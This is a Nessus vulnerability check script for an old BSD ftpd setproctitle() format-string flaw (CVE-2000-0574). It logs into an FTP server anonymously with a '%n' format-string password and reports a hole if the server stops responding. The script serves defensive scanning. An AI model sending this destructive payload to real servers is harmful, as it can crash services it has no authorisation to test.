#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#
# 
# Yes, this is an old flaw
#

if(description)
{
 script_id(11391);
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2000-b-0004");
 script_bugtraq_id(1425, 1438);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2000-0574");
 name["english"] = "BSD ftpd setproctitle() format string";

 script_name(english:name["english"]);

 desc["english"] = "
The remote FTP server misuses the function setproctitle() and
may allow an attacker to gain a root shell on this host by 
logging in as 'anonymous' and providing a carefully crafted 
format string as its email address.

Solution : upgrade your FTP server.
Risk factor : High";

 script_description(english:desc["english"]);


 script_summary(english:"Checks if the remote ftpd is vulnerable to format string attacks");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"FTP");

 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2003 Renaud Deraison");

 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_keys("ftp/anonymous");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here :
#
include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if (! get_port_state(port)) exit(0);


# Connect to the FTP server
soc = open_sock_tcp(port);
if(soc)
{
 banner = ftp_recv_line(socket:soc);
 if(!banner)exit(0);
 send(socket:soc, data:string("USER anonymous\r\n"));
 r = ftp_recv_line(socket:soc);
 if(!egrep(pattern:"^331", string:r))exit(0);
 send(socket:soc, data:string("PASS %n%n%n%n%n%n%n\r\n"));
 r = ftp_recv_line(socket:soc);
 if(!r || !egrep(pattern:"^230",  string:r))exit(0);
 send(socket:soc, data:string("HELP\r\n"));
 r = recv_line(socket:soc, length:4096);
 if(!r)security_hole(port);
}
